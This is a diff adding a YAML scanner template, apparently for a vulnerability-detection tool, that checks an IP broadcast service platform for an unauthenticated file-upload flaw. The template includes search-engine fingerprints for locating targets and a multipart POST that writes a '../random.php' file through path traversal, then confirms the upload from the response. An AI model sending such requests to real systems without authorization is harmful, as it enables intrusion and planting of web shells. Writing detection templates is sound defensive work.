@@ -1,0 +1,36 @@
+id: itc-remote-upgrade-fileupload
+
+info:
+  name: IP 广播服务平台未授权文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    hunter: web.icon=="9091011a03bffd9898d79fc589a2c65d"
+    fofa: icon_hash="-568806419"
+  reference:
+    - https://mp.weixin.qq.com/s/IlYncItSFMGiX_3ozegHVA
+  tags: itc,fileupload
+  created: 2024/08/10
+
+set:
+  filename: randomLowercase(6)
+  randstr: randomLowercase(30)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /api/v2/remote-upgrade/upload
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"../{{filename}}.php\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        {{randstr}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'"relative_path":') && response.body.bcontains(bytes('"name":"' + string(filename) + '.php"'))
+expression: r0()
